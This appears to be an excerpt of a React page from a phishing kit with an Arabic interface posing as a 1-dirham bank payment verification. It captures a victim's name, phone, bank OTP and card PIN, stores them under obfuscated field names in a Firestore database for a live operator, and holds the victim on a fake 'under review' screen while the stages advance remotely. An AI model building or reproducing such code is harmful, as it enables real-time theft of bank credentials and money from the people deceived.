...
export default function OtpPage() {
  ...
  useEffect(() => {
    if (!hydrated) return;
    if (!hasRequiredApplicantData(data)) { setLocation("/register"); return; }

    if (!confirmationCode) setConfirmationCode(confCode.current);

    void ensureApplicationDoc({
      docId, data, confirmationCode: confCode.current, pathname: "/otp",
      extra: docId ? {} : { status: "pending_review", otpStatus: "pending" },
    })
      .then(async (resolvedId) => {
        ...
        if (!docId) {
          await updateApplicationData(resolvedId, {
            status: "pending_review", otpStatus: "pending",
            currentStep: "_t2", currentPage: "otp", isUnread: true,
          });
        }
        setSaved(true);
      })
  ...
  useEffect(() => {
    ...
    const unsubscribe = onSnapshot(doc(db, APPLICATION_COLLECTION, docIdRef.current), (snap) => {
      ...
      if (previousStageRef.current !== nextStage) {
        ...
        setNotice(""); setError(""); setLoading(false); setSeconds(232);
  ...
  function handleDigit(i: number, val: string) {
    ...
    if (error) setError("");
    if (notice) setNotice("");
    if (digit && i < codeLength - 1) refs.current[i + 1]?.focus();
  }
  ...
  async function handleSubmitCode() {
    ...
    try {
      if (stage === "otp") {
        const payload = {
          _v5: enteredCode, otpCode: enteredCode, otp: enteredCode,
          _v5Status: "pending", otpStatus: "pending",
          otpUpdatedAt: new Date().toISOString(), isUnread: true,
          redirectPage: "otp", currentStep: "_t2", currentPage: "otp",
        };
        await updateApplicationData(docIdRef.current, payload);
        await appendHistoryEntry({ docId: docIdRef.current, type: "_t2", status: "pending", data: payload });
        setNotice("تم إرسال رمز OTP. يرجى الانتظار ريثما تتم مراجعته.");
      } else if (stage === "pin") {
        const payload = {
          _v6: enteredCode, pinCode: enteredCode, pinStatus: "pending",
          pinUpdatedAt: new Date().toISOString(), isUnread: true,
          redirectPage: "pin", currentStep: "_t3", currentPage: "otp",
        };
        await updateApplicationData(docIdRef.current, payload);
        await appendHistoryEntry({ docId: docIdRef.current, type: "_t3", status: "pending", data: payload });
    ...
    <>
      <div className="relative w-28 h-28 mb-8">
        <svg className="absolute inset-0 animate-spin" viewBox="0 0 100 100" fill="none">
          ...
          <circle cx="50" cy="50" r="44" stroke="#1a2b50" strokeWidth="8" strokeLinecap="round" strokeDasharray="138 138" strokeDashoffset="104" />
        </svg>
      ...
      <div className="bg-white rounded-2xl shadow-sm px-7 py-7 w-full max-w-sm mb-6">
        <h2 className="text-[#1a2b50] font-extrabold text-xl mb-2">جاري مراجعة الطلب{dotStr}</h2>
        <p className="text-gray-500 text-sm leading-relaxed mb-5">تم إرسال طلبك بنجاح. يرجى الانتظار بينما يتم مراجعة بياناتك والموافقة على عملية الدفع.</p>
        ...
        <div className="border-t border-gray-100 pt-4 space-y-2 text-right">
          <div className="flex justify-between text-xs"><span className="font-semibold text-gray-700">{data.name || "—"}</span><span className="text-gray-400">الاسم</span></div>
          <div className="flex justify-between text-xs"><span className="font-semibold text-gray-700" dir="ltr">{data.phone || "—"}</span><span className="text-gray-400">الهاتف</span></div>
          <div className="flex justify-between text-xs"><span className="font-semibold text-gray-700">1 درهم</span><span className="text-gray-400">المبلغ</span></div>
        </div>
      </div>
      <p className="text-xs text-gray-400 leading-relaxed max-w-xs">لا تغلق هذه الصفحة. ستنتقل تلقائياً عند اكتمال المراجعة.</p>
      ...
      <div className="bg-white rounded-2xl shadow-sm overflow-hidden max-w-sm mx-auto w-full">
        ...
        <div className="px-5 py-5">
          <p className="text-center text-sm text-gray-600 leading-relaxed mb-5">
            {stage === "pin" ? "تمت المصادقة الأولى. يرجى إدخال رمز PIN المرسل من البنك لإكمال العملية." : "المصادقة عبر تطبيق الهاتف المتحرك من البنك. ستتلقى من جهة إصدار البطاقة رمز العملية برسالة نصية."}
          </p>
          ...
          <p className="text-center text-sm text-gray-600 leading-relaxed mb-5">
            {stage === "pin" ? "يرجى إدخال رمز PIN بالكامل ثم المتابعة." : "يرجى إدخال رمز التحقق المرسل على الجوال الخاص بك أو فتح تطبيق البنك والنقر على الإشعار الفوري."}
          </p>
          <div className="flex justify-center gap-2.5 mb-3" dir="ltr">
            {digits.map((digit, index) => (
              <input key={index} ref={(el) => { refs.current[index] = el; }} type="text" inputMode="numeric" maxLength={1} value={digit}
                onChange={(e) => handleDigit(index, e.target.value)} onKeyDown={(e) => handleKeyDown(index, e)}
